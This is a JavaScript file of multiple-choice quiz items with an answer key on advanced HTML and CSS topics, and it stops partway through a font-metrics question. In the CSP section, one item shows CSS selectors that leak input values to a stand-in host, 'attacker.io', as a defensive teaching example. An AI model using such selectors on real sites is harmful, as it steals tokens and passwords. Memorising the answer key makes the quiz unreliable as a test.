export const htmlVeryHardChallenges = [
  {
    "title": "HTML & CSS: Browser Rendering Pipeline (DOM, CSSOM, Render Tree)",
    "description": "Parser-blocking scripts, render-blocking stylesheets, critical rendering path, and construction stages.",
    "timeLimitMinutes": 15,
    "tags": [
      "HTML & CSS",
      "HTML",
      "Frontend"
    ],
    "difficulty": "very hard",
    "questions": [
      {
        "question": "What is the precise sequence of steps in the browser Critical Rendering Path from raw bytes to screen pixels?",
        "options": [
          "Bytes -> Tokens -> DOM & CSSOM -> Render Tree -> Layout (Reflow) -> Paint -> Composite",
          "DOM -> Paint -> Layout -> CSSOM -> Composite",
          "Render Tree -> DOM -> Bytecode -> Paint",
          "HTML -> JavaScript -> Layout -> Paint"
        ],
        "correctAnswer": "Bytes -> Tokens -> DOM & CSSOM -> Render Tree -> Layout (Reflow) -> Paint -> Composite",
        "explanation": "The browser tokenizes bytes into DOM and CSSOM, merges them into the Render Tree, computes geometry in Layout, draws pixels in Paint, and composites layers."
      },
      {
        "question": "Why does a synchronous `<script src='app.js'></script>` without `async` or `defer` block HTML parsing?",
        "options": [
          "The script may call `document.write()` or inspect preceding DOM, so the HTML parser must pause until the script downloads and executes",
          "Browsers can only download one file at a time",
          "JavaScript uses the same CPU thread as network sockets",
          "The browser clears the DOM when loading scripts"
        ],
        "correctAnswer": "The script may call `document.write()` or inspect preceding DOM, so the HTML parser must pause until the script downloads and executes",
        "explanation": "Because synchronous scripts can modify the DOM tree mid-parse, the parser must halt until the script is evaluated."
      },
      {
        "question": "Why are external stylesheets (`<link rel='stylesheet'>`) considered 'render-blocking' even though they do not block DOM construction?",
        "options": [
          "The browser cannot compute the Render Tree without the CSSOM, holding off rendering to prevent Flash of Unstyled Content (FOUC)",
          "CSS files pause the HTML tokenizer",
          "They disable JavaScript execution permanently",
          "Browsers reject unstyled HTML"
        ],
        "correctAnswer": "The browser cannot compute the Render Tree without the CSSOM, holding off rendering to prevent Flash of Unstyled Content (FOUC)",
        "explanation": "The browser waits for CSSOM construction before painting to prevent jarring unstyled content flashes."
      },
      {
        "question": "Do elements with `display: none` exist in the Render Tree?",
        "options": [
          "No, `display: none` elements are present in the DOM tree but completely excluded from the Render Tree because they generate no boxes",
          "Yes, with 0px width and height",
          "Yes, but with 0 opacity",
          "They are purged from both DOM and Render Tree"
        ],
        "correctAnswer": "No, `display: none` elements are present in the DOM tree but completely excluded from the Render Tree because they generate no boxes",
        "explanation": "The Render Tree only contains nodes that require visual painting. `visibility: hidden` takes layout space; `display: none` is omitted entirely."
      },
      {
        "question": "What is the key execution timing difference between `<script defer>` and `<script async>`?",
        "options": [
          "`defer` downloads in parallel and executes in strict DOM order after HTML parsing finishes; `async` downloads in parallel and executes immediately upon arrival, pausing the parser",
          "`async` preserves script execution order; `defer` does not",
          "`defer` runs before DOM parsing starts",
          "`async` is for CSS; `defer` is for JS"
        ],
        "correctAnswer": "`defer` downloads in parallel and executes in strict DOM order after HTML parsing finishes; `async` downloads in parallel and executes immediately upon arrival, pausing the parser",
        "explanation": "`defer` guarantees execution order right before `DOMContentLoaded`. `async` executes whenever the file finishes downloading."
      }
    ]
  },
  {
    "title": "HTML & CSS: Layout, Paint & Composite Pipeline Optimization",
    "description": "Forced synchronous layouts (layout thrashing), fast/slow paths, GPU rasterization, and DevTools profiling.",
    "timeLimitMinutes": 15,
    "tags": [
      "HTML & CSS",
      "HTML",
      "Frontend"
    ],
    "difficulty": "very hard",
    "questions": [
      {
        "question": "What causes 'Forced Synchronous Layout' (Layout Thrashing) in JavaScript animation loops?",
        "codeSnippet": "for (let i = 0; i < items.length; i++) {\n  // What triggers layout thrashing here?\n  const h = items[i].offsetHeight; // Read geometry\n  items[i].style.height = (h + 10) + 'px'; // Invalidate geometry\n}",
        "language": "javascript",
        "options": [
          "Interleaving geometry reads (`offsetHeight`) immediately after DOM writes (`style.height`), forcing the browser to recalculate layout synchronously on every loop iteration",
          "Using a `for` loop instead of `map()`",
          "Modifying DOM elements in JavaScript",
          "Accessing `items.length` dynamically"
        ],
        "correctAnswer": "Interleaving geometry reads (`offsetHeight`) immediately after DOM writes (`style.height`), forcing the browser to recalculate layout synchronously on every loop iteration",
        "explanation": "Reading layout metrics forces the browser to flush pending style changes and compute layout immediately rather than batching at the end of the frame."
      },
      {
        "question": "How does batching DOM reads before DOM writes (e.g. using `requestAnimationFrame` or FastDOM) prevent layout thrashing?",
        "options": [
          "All geometry reads query the cached layout without forcing recalculation; all writes are batched and flushed once during the next frame",
          "It disables CSS animations",
          "It runs layout on a Web Worker",
          "It bypasses the GPU"
        ],
        "correctAnswer": "All geometry reads query the cached layout without forcing recalculation; all writes are batched and flushed once during the next frame",
        "explanation": "Separating reads and writes allows the browser to perform a single clean layout pass per animation frame."
      },
      {
        "question": "Which properties trigger ONLY the Composite stage (bypassing both Layout and Paint) on modern browser engines?",
        "options": [
          "`transform` and `opacity`",
          "`top` and `left`",
          "`width` and `height`",
          "`color` and `background-color`"
        ],
        "correctAnswer": "`transform` and `opacity`",
        "explanation": "`transform` and `opacity` operate directly on pre-rasterized GPU textures without requiring CPU layout or painting passes."
      },
      {
        "question": "Why does animating `left` or `margin-left` cause stutter (jank) on low-end devices compared to `transform: translateX()`?",
        "options": [
          "`left` forces the CPU to recalculate page geometry (Layout) and repaint pixels on every single frame, whereas `translateX` shifts the layer on the GPU thread",
          "`left` has a 16ms delay built-in",
          "`margin-left` disables hardware acceleration",
          "`translateX` reduces image quality"
        ],
        "correctAnswer": "`left` forces the CPU to recalculate page geometry (Layout) and repaint pixels on every single frame, whereas `translateX` shifts the layer on the GPU thread",
        "explanation": "Layout changes block the browser main thread; compositor transforms run smoothly on the compositor thread."
      },
      {
        "question": "In Chrome DevTools Performance panel, what does a long purple bar represent?",
        "options": [
          "Layout / Reflow calculation",
          "JavaScript compilation",
          "Paint rasterization",
          "Network download"
        ],
        "correctAnswer": "Layout / Reflow calculation",
        "explanation": "Chrome DevTools color-codes activity: Yellow = Scripting, Purple = Rendering/Layout, Green = Painting."
      }
    ]
  },
  {
    "title": "HTML & CSS: View Transitions API & Smooth Page Transitions",
    "description": "document.startViewTransition(), ::view-transition pseudo-elements, MPA cross-document transitions, and morphing.",
    "timeLimitMinutes": 15,
    "tags": [
      "HTML & CSS",
      "HTML",
      "Frontend"
    ],
    "difficulty": "very hard",
    "questions": [
      {
        "question": "How does the View Transitions API (`document.startViewTransition()`) achieve seamless animated transitions between DOM states?",
        "codeSnippet": "document.startViewTransition(() => {\n  updateTheDOMSomehow();\n});",
        "language": "javascript",
        "options": [
          "Takes a snapshot of the old state, updates the DOM, takes a snapshot of the new state, and animates between them in top-layer pseudo-elements (`::view-transition`)",
          "Renders both states in separate iframes and cross-fades them",
          "Records an MP4 video of the page",
          "Intercepts GPU framebuffer pixels directly via WebGL"
        ],
        "correctAnswer": "Takes a snapshot of the old state, updates the DOM, takes a snapshot of the new state, and animates between them in top-layer pseudo-elements (`::view-transition`)",
        "explanation": "The API captures old and new visual snapshots, constructing pseudo-element trees that CSS animates automatically."
      },
      {
        "question": "How do you morph an individual element (like an image expanding from a card to a hero header) across view transitions?",
        "codeSnippet": ".card-img {\n  view-transition-name: selected-image;\n}",
        "language": "css",
        "options": [
          "Assign matching `view-transition-name: selected-image;` to the element in both old and new DOM states",
          "Use JavaScript FLIP calculations",
          "Set matching IDs on both images",
          "Wrap both images in a `<transition>` tag"
        ],
        "correctAnswer": "Assign matching `view-transition-name: selected-image;` to the element in both old and new DOM states",
        "explanation": "Matching `view-transition-name` connects elements across transitions, automatically animating position and size morphs."
      },
      {
        "question": "How do you opt into Multi-Page App (MPA) cross-document view transitions without JavaScript in modern CSS?",
        "codeSnippet": "@view-transition {\n  navigation: auto;\n}",
        "language": "css",
        "options": [
          "Add `@view-transition { navigation: auto; }` to the stylesheet on both pages",
          "Set `<html data-transition='cross-page'>`",
          "Add `target='_transition'` to links",
          "Configure HTTP header `X-View-Transition: true`"
        ],
        "correctAnswer": "Add `@view-transition { navigation: auto; }` to the stylesheet on both pages",
        "explanation": "`@view-transition { navigation: auto; }` enables native cross-document transitions during standard link navigation."
      },
      {
        "question": "Which root pseudo-element hosts the entire View Transition tree in the document?",
        "options": [
          "::transition-root",
          "::view-transition",
          "::view-root",
          "::page-transition"
        ],
        "correctAnswer": "::view-transition",
        "explanation": "`::view-transition` is the top-level container inserted into the top layer to host the transition snapshots."
      },
      {
        "question": "What CSS property allows customizing the animation between the old and new snapshot pairs of a transition group?",
        "options": [
          "::view-snapshot-before and ::view-snapshot-after",
          "::view-transition-old(name) and ::view-transition-new(name)",
          "::transition-from and ::transition-to",
          "::morph-pair"
        ],
        "correctAnswer": "::view-transition-old(name) and ::view-transition-new(name)",
        "explanation": "Targeting `::view-transition-old()` and `::view-transition-new()` allows applying custom CSS animations to the cross-fading snapshots."
      }
    ]
  },
  {
    "title": "HTML & CSS: CSS Houdini (Paint API & Typed OM)",
    "description": "CSS.paintWorklet, registerPaint, CSS Typed OM (CSSStyleValue), and custom property registration (CSS.registerProperty).",
    "timeLimitMinutes": 15,
    "tags": [
      "HTML & CSS",
      "HTML",
      "Frontend"
    ],
    "difficulty": "very hard",
    "questions": [
      {
        "question": "What capability does the CSS Houdini Paint API (`CSS.paintWorklet.addModule()`) give web developers?",
        "codeSnippet": ".smooth-corners {\n  background: paint(squircle);\n}",
        "language": "css",
        "options": [
          "Compiles WebGPU shaders into CSS",
          "Allows writing custom 2D canvas drawing code inside background worklet threads that renders directly into the browser's native paint pipeline",
          "Generates PNG files on the backend server",
          "Injects inline SVG into DOM nodes"
        ],
        "correctAnswer": "Allows writing custom 2D canvas drawing code inside background worklet threads that renders directly into the browser's native paint pipeline",
        "explanation": "Houdini Paint API lets you define custom image and background drawing routines that execute directly in the browser paint phase."
      },
      {
        "question": "How does CSS Houdini's CSS Typed OM improve upon legacy string-based `element.style` manipulation?",
        "codeSnippet": "// Typed OM:\nelement.attributeStyleMap.set('opacity', CSS.number(0.5));\nelement.attributeStyleMap.set('margin-top', CSS.px(20));",
        "language": "javascript",
        "options": [
          "Runs CSS calculations on a GPU shader",
          "Exposes CSS values as typed JavaScript objects (`CSSUnitValue`) with arithmetic and unit conversion methods, eliminating string parsing overhead and bugs",
          "Enforces TypeScript interfaces in CSS",
          "Converts CSS to JSON strings"
        ],
        "correctAnswer": "Exposes CSS values as typed JavaScript objects (`CSSUnitValue`) with arithmetic and unit conversion methods, eliminating string parsing overhead and bugs",
        "explanation": "Typed OM eliminates brittle string concatenation (`'20px' + 10`), providing high-performance typed objects."
      },
      {
        "question": "What does `CSS.registerProperty()` (or `@property` in CSS) allow that standard CSS variables cannot do?",
        "codeSnippet": "@property --gradient-angle {\n  syntax: '<angle>';\n  inherits: false;\n  initial-value: 0deg;\n}",
        "language": "css",
        "options": [
          "Protects CSS variables from being read by JavaScript",
          "Defines explicit syntax types (`<color>`, `<angle>`, `<length>`), initial values, and inheritance, enabling CSS transitions and animations on custom properties",
          "Makes variables accessible across different domain names",
          "Saves variable values in browser cookies"
        ],
        "correctAnswer": "Defines explicit syntax types (`<color>`, `<angle>`, `<length>`), initial values, and inheritance, enabling CSS transitions and animations on custom properties",
        "explanation": "Standard CSS variables are untyped tokens and cannot interpolate. `@property` declares formal syntax, enabling smooth transitions."
      },
      {
        "question": "Why do Houdini worklets execute in isolated Worker threads rather than the main window thread?",
        "options": [
          "Because browsers cannot execute JavaScript on the main thread",
          "To guarantee that paint routines run without accessing the DOM or blocking user interface interaction, ensuring 60fps rendering",
          "To access GPU memory exclusively",
          "To communicate with external APIs securely"
        ],
        "correctAnswer": "To guarantee that paint routines run without accessing the DOM or blocking user interface interaction, ensuring 60fps rendering",
        "explanation": "Paint worklets run in isolated environments without DOM or global scope access, enabling fast, multi-threaded painting."
      },
      {
        "question": "Which method in a paint worklet class receives the Canvas 2D context and geometry dimensions?",
        "options": [
          "draw(canvas, size)",
          "paint(ctx, geometry, properties)",
          "render(context)",
          "execute(surface)"
        ],
        "correctAnswer": "paint(ctx, geometry, properties)",
        "explanation": "The registered paint class implements `paint(ctx, geom, props)` to draw directly into the element's paint surface."
      }
    ]
  },
  {
    "title": "HTML & CSS: Scroll-Driven Animations (`animation-timeline`)",
    "description": "scroll() and view() timelines, animation-range (entry, exit), and pure CSS parallax/progress bars.",
    "timeLimitMinutes": 15,
    "tags": [
      "HTML & CSS",
      "HTML",
      "Frontend"
    ],
    "difficulty": "very hard",
    "questions": [
      {
        "question": "What is the key difference between `animation-timeline: scroll()` and `animation-timeline: view()` in CSS Scroll-Driven Animations?",
        "codeSnippet": "/* Timeline A: */\n.progress-bar { animation-timeline: scroll(root block); }\n/* Timeline B: */\n.reveal-card  { animation-timeline: view(); }",
        "language": "css",
        "options": [
          "`view()` requires WebGL",
          "`scroll()` links animation progress to the scrollbar position of a container; `view()` links progress to an element's visibility as it enters and exits the viewport",
          "`scroll()` only works on mouse wheel events",
          "There is no difference; they are aliases"
        ],
        "correctAnswer": "`scroll()` links animation progress to the scrollbar position of a container; `view()` links progress to an element's visibility as it enters and exits the viewport",
        "explanation": "`scroll()` tracks container scroll progress (e.g. reading progress bar). `view()` tracks an element moving through the visible viewport."
      },
      {
        "question": "Why are CSS Scroll-Driven Animations vastly superior in performance to JavaScript `window.onscroll` listeners?",
        "options": [
          "They compress scroll events into binary arrays",
          "The browser compositor thread evaluates scroll-driven timelines directly off the main thread, maintaining 60/120fps with zero JavaScript execution overhead",
          "They disable mouse scroll acceleration",
          "They pre-render the entire web page as a texture"
        ],
        "correctAnswer": "The browser compositor thread evaluates scroll-driven timelines directly off the main thread, maintaining 60/120fps with zero JavaScript execution overhead",
        "explanation": "Compositor-driven animations bypass main thread JavaScript, preventing jank even when scripts are busy."
      },
      {
        "question": "What does `animation-range: entry 0% entry 100%;` specify on a `view()` timeline animation?",
        "options": [
          "The animation loops continuously until the element leaves",
          "The animation begins the instant the top of the element touches the bottom of the viewport and ends when the element is fully inside the viewport",
          "The animation plays only on user click",
          "The animation is delayed by 100 milliseconds"
        ],
        "correctAnswer": "The animation begins the instant the top of the element touches the bottom of the viewport and ends when the element is fully inside the viewport",
        "explanation": "`entry` maps to the phase where the element enters the viewport from 0% visible to 100% visible."
      },
      {
        "question": "How do you create a reading progress bar across the entire page using pure CSS scroll timelines?",
        "codeSnippet": ".reading-progress {\n  scale: 0 1;\n  transform-origin: left;\n  animation: grow auto linear;\n  animation-timeline: scroll();\n}",
        "language": "css",
        "options": [
          "Use JavaScript `window.scrollY / totalHeight`",
          "Animate `scaleX` from 0 to 1 with `animation-timeline: scroll()`",
          "Use `@keyframes progress { to { width: 100vw; } }` with `animation-timeline: view()`",
          "Set `scroll-behavior: smooth`"
        ],
        "correctAnswer": "Animate `scaleX` from 0 to 1 with `animation-timeline: scroll()`",
        "explanation": "Pairing a horizontal scale animation with `animation-timeline: scroll()` produces a hardware-accelerated progress bar in pure CSS."
      },
      {
        "question": "Which named scroll timeline axis specifies the vertical scroll direction in horizontal writing modes?",
        "options": [
          "inline",
          "block",
          "y",
          "vertical"
        ],
        "correctAnswer": "block",
        "explanation": "`block` refers to the dimension perpendicular to text flow (vertical in horizontal writing modes)."
      }
    ]
  },
  {
    "title": "HTML & CSS: Speculative Rules API & Prerendering Architecture",
    "description": "Speculation Rules (<script type='speculationrules'>), prefetch vs prerender, and instant page navigations.",
    "timeLimitMinutes": 15,
    "tags": [
      "HTML & CSS",
      "HTML",
      "Frontend"
    ],
    "difficulty": "very hard",
    "questions": [
      {
        "question": "What does the Speculation Rules API (`<script type='speculationrules'>`) allow modern browsers to do?",
        "codeSnippet": "<script type='speculationrules'>\n{\n  \"prerender\": [\n    {\n      \"source\": \"list\",\n      \"urls\": [\"/arena/quiz/next\"]\n    }\n  ]\n}\n</script>",
        "language": "html",
        "options": [
          "Predict which options a user will choose in a form",
          "Speculatively pre-render an entire target web page in an invisible background tab before the user clicks, enabling near-instant 0ms page transitions",
          "Minify JavaScript dynamically on the client",
          "Cache database queries in IndexedDB"
        ],
        "correctAnswer": "Speculatively pre-render an entire target web page in an invisible background tab before the user clicks, enabling near-instant 0ms page transitions",
        "explanation": "Speculation Rules render target pages in an invisible background renderer so navigation appears instantaneous upon click."
      },
      {
        "question": "What is the key technical difference between `prefetch` and `prerender` in Speculation Rules?",
        "options": [
          "`prefetch` requires a service worker",
          "`prerender` is for images only",
          "`prefetch` only downloads the main HTML response into HTTP cache; `prerender` downloads HTML, fetches subresources, parses DOM, executes JS, and builds the render tree in background",
          "`prerender` cannot be cancelled"
        ],
        "correctAnswer": "`prefetch` only downloads the main HTML response into HTTP cache; `prerender` downloads HTML, fetches subresources, parses DOM, executes JS, and builds the render tree in background",
        "explanation": "`prefetch` fetches bytes. `prerender` spins up a background browsing context and renders the page completely."
      },
      {
        "question": "How can you restrict speculation rules to prerender links only when the user hovers or pointer-downs on them (`eagerness`)?",
        "codeSnippet": "\"prerender\": [{\n  \"where\": { \"href_matches\": \"/*\" },\n  \"eagerness\": \"moderate\"\n}]",
        "language": "json",
        "options": [
          "Use a JavaScript event listener",
          "Set `\"trigger\": \"mouse\"`",
          "Set `\"eagerness\": \"moderate\"` (initiates speculation on hover or pointerdown) or `\"conservative\"` (on pointerdown only)",
          "Set `\"priority\": \"high\"`"
        ],
        "correctAnswer": "Set `\"eagerness\": \"moderate\"` (initiates speculation on hover or pointerdown) or `\"conservative\"` (on pointerdown only)",
        "explanation": "`eagerness` levels (`immediate`, `eager`, `moderate`, `conservative`) regulate bandwidth usage by triggering only on strong user intent signals."
      },
      {
        "question": "Why are pages with side-effect operations (e.g. `/logout` or `/checkout/pay`) dangerous to include in speculation rules?",
        "options": [
          "They invalidate SSL certificates",
          "They cause browser tabs to crash",
          "The browser will execute the page and its JavaScript in the background, inadvertently triggering actions like logging out the user or charging a payment",
          "They leak user passwords"
        ],
        "correctAnswer": "The browser will execute the page and its JavaScript in the background, inadvertently triggering actions like logging out the user or charging a payment",
        "explanation": "Because `prerender` executes JavaScript, mutating endpoints should never be targeted by speculative rules."
      },
      {
        "question": "What property on `document` indicates to JavaScript if the page is currently being prerendered in the background?",
        "options": [
          "document.hiddenState",
          "document.isSpeculative",
          "document.prerendering",
          "document.backgroundRender"
        ],
        "correctAnswer": "document.prerendering",
        "explanation": "`document.prerendering` is a boolean flag that is `true` while the page is running in a speculative prerender context."
      }
    ]
  },
  {
    "title": "HTML & CSS: Content Security Policy (CSP) & Inline Style Sandboxing",
    "description": "style-src, nonce-based CSP, hash-based CSP, unsafe-inline risks, and style injection defense.",
    "timeLimitMinutes": 15,
    "tags": [
      "HTML & CSS",
      "HTML",
      "Frontend"
    ],
    "difficulty": "very hard",
    "questions": [
      {
        "question": "Why does a strict Content Security Policy (`style-src 'self' 'nonce-r4nd0m'`) block inline `<style>` and `style='...'` attributes by default?",
        "options": [
          "To force developers to write external CSS files",
          "Because inline styles slow down HTML parsing",
          "To prevent CSS Injection and Cross-Site Scripting (XSS) attacks where attackers inject malicious styles to exfiltrate sensitive data via URL pingbacks",
          "Inline styles are deprecated in HTML5"
        ],
        "correctAnswer": "To prevent CSS Injection and Cross-Site Scripting (XSS) attacks where attackers inject malicious styles to exfiltrate sensitive data via URL pingbacks",
        "explanation": "Disallowing `unsafe-inline` stops attackers from injecting attribute selectors that leak sensitive characters via `background: url(...)`."
      },
      {
        "question": "How does a CSP cryptographic nonce (`nonce='...'`) work for permitting specific inline style tags?",
        "codeSnippet": "<style nonce='EDNnf03nce00hsFn'>\n  :root { --accent: #4f46e5; }\n</style>",
        "language": "html",
        "options": [
          "The nonce is stored in localStorage",
          "The browser hashes the style tag's content using MD5",
          "The server generates a unique, unguessable cryptographic token per HTTP request and sends it in both the CSP header and matching `nonce` attributes",
          "The nonce is verified by DNS servers"
        ],
        "correctAnswer": "The server generates a unique, unguessable cryptographic token per HTTP request and sends it in both the CSP header and matching `nonce` attributes",
        "explanation": "A random per-request nonce allows authorized inline styles while blocking injected inline scripts/styles that lack the valid token."
      },
      {
        "question": "How can CSS injection be exploited to exfiltrate sensitive data (such as CSRF tokens or password inputs) without executing JavaScript?",
        "codeSnippet": "input[value^='a'] { background: url('https://attacker.io/leak?char=a'); }\ninput[value^='b'] { background: url('https://attacker.io/leak?char=b'); }",
        "language": "css",
        "options": [
          "By re-routing DNS queries via CSS variables",
          "By overflowing the browser stack buffer",
          "Using CSS attribute value prefix selectors (`input[value^='...']`) that trigger external background image requests to the attacker's server for each matched character",
          "By converting CSS colors into shellcode"
        ],
        "correctAnswer": "Using CSS attribute value prefix selectors (`input[value^='...']`) that trigger external background image requests to the attacker's server for each matched character",
        "explanation": "CSS data exfiltration uses attribute selectors to trigger background URL requests, progressively leaking input values character-by-character."
      },
      {
        "question": "What does the CSP directive `style-src-attr` control independently of `style-src-elem`?",
        "options": [
          "`style-src-attr` is for SVG files only",
          "`style-src-attr` controls stylesheet file sizes",
          "`style-src-attr` specifically governs inline `style='...'` attributes on HTML elements, while `style-src-elem` governs `<style>` tags and `<link>` elements",
          "There is no difference"
        ],
        "correctAnswer": "`style-src-attr` specifically governs inline `style='...'` attributes on HTML elements, while `style-src-elem` governs `<style>` tags and `<link>` elements",
        "explanation": "CSP Level 3 split style rules into element sources (`<style>`, `<link>`) and attribute sources (`style='...'`)."
      },
      {
        "question": "What header directive instructs the browser to report CSP violations to an endpoint without actually blocking any resources?",
        "options": [
          "X-CSP-Audit",
          "Content-Security-Policy-Debug",
          "Content-Security-Policy-Report-Only",
          "Report-To only"
        ],
        "correctAnswer": "Content-Security-Policy-Report-Only",
        "explanation": "`Content-Security-Policy-Report-Only` monitors and reports policy violations to your reporting URI without breaking existing site functionality."
      }
    ]
  },
  {
    "title": "HTML & CSS: Shadow DOM Encapsulation & CSS Scope (@scope)",
    "description": "attachShadow({mode: 'open'}), :host and :host-context, ::slotted, and CSS @scope doughnut scoping.",
    "timeLimitMinutes": 15,
    "tags": [
      "HTML & CSS",
      "HTML",
      "Frontend"
    ],
    "difficulty": "very hard",
    "questions": [
      {
        "question": "What does the modern CSS `@scope` rule achieve without requiring Web Components or Shadow DOM?",
        "codeSnippet": "@scope (.card) to (.card-content) {\n  img { border-radius: 8px; }\n}",
        "language": "css",
        "options": [
          "Deletes matching styles after page load",
          "Encapsulates CSS into an iframe",
          "Doughnut scoping: limits CSS selector matching to a root element (.card) while excluding nested sub-trees (.card-content) cleanly",
          "Converts styles to inline attributes"
        ],
        "correctAnswer": "Doughnut scoping: limits CSS selector matching to a root element (.card) while excluding nested sub-trees (.card-content) cleanly",
        "explanation": "`@scope (root) to (boundary)` confines styles to a specific DOM slice, punching holes out of child boundaries."
      },
      {
        "question": "How do styles defined inside a Web Component's Shadow DOM behave relative to the outer light DOM page?",
        "options": [
          "Shadow DOM cannot use CSS",
          "Shadow DOM styles override all page styles globally",
          "Shadow DOM styles are strictly encapsulated: rules inside the shadow root do not leak out to affect the page, and outer page selectors do not select inside",
          "Outer page classes are duplicated into the shadow root"
        ],
        "correctAnswer": "Shadow DOM styles are strictly encapsulated: rules inside the shadow root do not leak out to affect the page, and outer page selectors do not select inside",
        "explanation": "Shadow DOM provides true boundary scoping: internal styles stay contained, and global page styles cannot pierce the shadow boundary."
      },
      {
        "question": "How can outer page global styles pierce the Shadow DOM boundary cleanly to theme custom elements?",
        "options": [
          "Using `document.querySelectorAll('* /deep/')`",
          "Using `!important` on the outer page",
          "Via CSS Custom Properties (CSS variables) or the `::part()` pseudo-element explicitly exposed by the component",
          "By disabling shadow boundaries in the browser"
        ],
        "correctAnswer": "Via CSS Custom Properties (CSS variables) or the `::part()` pseudo-element explicitly exposed by the component",
        "explanation": "CSS custom properties inherit across shadow boundaries, and `::part()` allows deliberate styling of exposed component internals."
      },
      {
        "question": "What does the `:host` pseudo-class selector target when written inside a Shadow DOM stylesheet?",
        "codeSnippet": ":host([disabled]) {\n  opacity: 0.5;\n  pointer-events: none;\n}",
        "language": "css",
        "options": [
          "The server hosting the website",
          "The window object",
          "The document body",
          "The custom element itself (the host element that contains the shadow root)"
        ],
        "correctAnswer": "The custom element itself (the host element that contains the shadow root)",
        "explanation": "`:host` selects the custom element hosting the shadow root, allowing conditional styling based on its attributes or classes."
      },
      {
        "question": "How does the `::slotted()` pseudo-element style projected content inside a `<slot>`?",
        "codeSnippet": "::slotted(p) {\n  color: #4f46e5;\n}",
        "language": "css",
        "options": [
          "Hides the slot contents",
          "Creates a new virtual slot element",
          "Styles children nested deep inside slotted elements",
          "Styles top-level light DOM elements that are distributed into that slot from the outer document"
        ],
        "correctAnswer": "Styles top-level light DOM elements that are distributed into that slot from the outer document",
        "explanation": "`::slotted(selector)` targets the root nodes projected into a `<slot>` from the light DOM."
      }
    ]
  },
  {
    "title": "HTML & CSS: Complex Responsive Typography with `clamp()` & Fluid Math",
    "description": "clamp(min, preferred, max), fluid font-size scaling, viewport interpolation, and preventing zoom failure.",
    "timeLimitMinutes": 15,
    "tags": [
      "HTML & CSS",
      "HTML",
      "Frontend"
    ],
    "difficulty": "very hard",
    "questions": [
      {
        "question": "In `font-size: clamp(1rem, 2.5vw + 0.5rem, 2.5rem);`, how does the font size scale across viewport widths?",
        "options": [
          "It requires media queries to evaluate",
          "It alternates randomly between 1rem and 2.5rem",
          "It locks the font size to 2.5vw exclusively",
          "It scales fluidly with viewport width (`2.5vw + 0.5rem`), but will never shrink below `1rem` on mobile or grow larger than `2.5rem` on wide screens"
        ],
        "correctAnswer": "It scales fluidly with viewport width (`2.5vw + 0.5rem`), but will never shrink below `1rem` on mobile or grow larger than `2.5rem` on wide screens",
        "explanation": "`clamp(MIN, PREFERRED, MAX)` constrains fluid scaling between safe lower and upper limits."
      },
      {
        "question": "Why is pure `font-size: 5vw;` an accessibility failure (violating WCAG 1.4.4 Resize Text)?",
        "options": [
          "Search engines cannot index viewport text",
          "It causes text to render upside down on Safari",
          "`5vw` is invalid CSS syntax for font-size",
          "Pure viewport units do not scale when a visually impaired user zooms in using browser zoom (Ctrl +), because the viewport pixel width remains unchanged"
        ],
        "correctAnswer": "Pure viewport units do not scale when a visually impaired user zooms in using browser zoom (Ctrl +), because the viewport pixel width remains unchanged",
        "explanation": "Browser zoom relies on scaling `rem` and font sizes. Pure `vw` ignores zoom; blending with `rem` (`calc(1rem + 2vw)`) preserves zoomability."
      },
      {
        "question": "How do you calculate the exact linear interpolation slope ($m$) and intercept ($b$) to fluidly scale from 16px at 400px viewport to 32px at 1200px viewport?",
        "options": [
          "Multiply 16px by 32px",
          "Slope is $400 / 1200 = 0.33vw$",
          "Take the average of 16 and 32",
          "Slope $m = (32 - 16) / (1200 - 400) = 16 / 800 = 0.02$ (2vw); Intercept $b = 16 - (400 \\times 0.02) = 8px$ ($0.5rem$); Formula: `clamp(1rem, 2vw + 0.5rem, 2rem)`"
        ],
        "correctAnswer": "Slope $m = (32 - 16) / (1200 - 400) = 16 / 800 = 0.02$ (2vw); Intercept $b = 16 - (400 \\times 0.02) = 8px$ ($0.5rem$); Formula: `clamp(1rem, 2vw + 0.5rem, 2rem)`",
        "explanation": "Using linear equations $y = mx + b$ gives precise fluid scaling between target minimum and maximum screen breakpoints."
      },
      {
        "question": "What does `min()` and `max()` do in modern mathematical CSS expressions?",
        "options": [
          "They are deprecated by `clamp()`",
          "They set database minimums and maximums",
          "`min()` only works on pixels; `max()` on percentages",
          "`min(a, b)` selects the smaller of the two values; `max(a, b)` selects the larger value dynamically"
        ],
        "correctAnswer": "`min(a, b)` selects the smaller of the two values; `max(a, b)` selects the larger value dynamically",
        "explanation": "`min()` and `max()` evaluate multiple mathematical expressions dynamically, picking the smallest or largest result."
      },
      {
        "question": "Can `clamp()` be used on layout properties like `padding`, `margin`, and `grid-gap`?",
        "options": [
          "Only with pixel units",
          "No, `clamp()` is restricted strictly to `font-size`",
          "Only in CSS Grid containers",
          "Yes, `clamp()` is a general-purpose math function applicable to any CSS property that accepts length, angle, time, or frequency values"
        ],
        "correctAnswer": "Yes, `clamp()` is a general-purpose math function applicable to any CSS property that accepts length, angle, time, or frequency values",
        "explanation": "`clamp()` is universally supported across all dimensional CSS properties for fluid spacing, margins, and layouts."
      }
    ]
  },
  {
    "title": "HTML & CSS: Subpixel Antialiasing & Font Metrics Overrides",
    "description": "-webkit-font-smoothing, text-rendering: optimizeLegibility, @font-face size-adjust, ascent-override, and fallback alignment.",
    "timeLimitMinutes": 15,
    "tags": [
      "HTML & CSS",
      "HTML",
      "Frontend"
    ],
    "difficulty": "very hard",
    "questions": [
      {
        "question": "What problem do modern CSS `@font-face` metric override descriptors (`ascent-override`, `descent-override`, `size-adjust`) solve during font loading?",
        "codeSnippet": "@font-face {\n  font-family: 'Fallback-Arial';\n  src: local('Arial');\n  ascent-override: 95%;\n  descent-override: 25%;\n  size-adjust: 105%;\n}",
        "language": "css",
        "options": [
          "They encrypt font files from unauthorized downloads",
          "They translate text into different languages",
          "They convert vector fonts to bitmap fonts",
          "They match the dimensions of a system fallback font to the exact bounding box of the incoming web font, eliminating Cumulative Layout Shift (CLS) when fonts swap"
        ],
        "correctAnswer": "They match the dimensions of a system fallback font to the exact bounding box of the incoming web font, eliminating Cumulative Layout Shift (CLS) when fonts swap",
        "explanation": "Metric overrides stretch and align fallback font metrics to perfectly mirror the web font, eliminating layout shifts when `font-display: swap` kicks in."
      },
      {
        "question": "What does `-webkit-font-smoothing: antialiased;` do on macOS and iOS WebKit engines?",
        "options": [
          "Disables font kerning",
          "Enables 3D text extrusion",
          "Converts fonts to bold",
          "Switches text rasterization from subpixel antialiasing to grayscale antialiasing, rendering text slightly thinner and crisper on dark backgrounds"
        ],
